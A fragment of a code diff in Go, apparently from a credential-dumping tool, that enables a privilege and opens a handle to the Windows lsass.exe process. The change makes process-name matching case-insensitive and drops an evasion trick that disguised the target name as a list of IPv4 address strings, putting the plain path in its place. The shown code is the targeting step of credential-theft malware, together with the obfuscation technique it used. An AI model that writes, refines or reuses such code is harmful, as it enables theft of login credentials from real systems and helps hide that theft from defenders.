@@ -233,7 +233,7 @@ func GetProcessByName(process_name string) uintptr{
             break
         }
         aux_proc_name := GetProcNameFromHandle(s)
-        if (aux_proc_name == process_name){
+        if strings.ToLower(aux_proc_name) == strings.ToLower(process_name){
             return s
         }
     }
@@ -639,9 +639,10 @@ func main() {
     fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)
 
     // Decode process name to "C:\\WINDOWS\\system32\\lsass.exe"
-    process_name_ipv4_encoded := []string{"67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"}
-    process_name := decodeIPV4(process_name_ipv4_encoded)
-    
+    // process_name_ipv4_encoded := []string{"67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"}
+    // process_name := decodeIPV4(process_name_ipv4_encoded)
+    process_name := "c:\\windows\\system32\\lsass.exe"
+
     // Get process handle
     proc_handle := GetProcessByName(process_name)
     fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
